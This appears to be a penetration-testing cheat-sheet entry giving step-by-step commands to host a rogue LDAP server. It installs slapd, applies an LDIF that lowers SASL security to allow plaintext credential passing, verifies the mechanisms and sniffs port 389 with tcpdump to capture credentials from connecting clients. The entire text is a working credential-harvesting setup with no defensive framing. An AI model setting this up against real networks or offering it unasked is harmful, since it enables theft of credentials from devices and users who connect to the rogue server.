Hosting a Rogue LDAP Server

	sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd

Create new file: olcSaslSecProps.ldif
```
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

Start rogue LDAP server

	sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart

Check if start was successfull

	ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms

Listen for connection

	sudo tcpdump -SX -i [interface] tcp port 389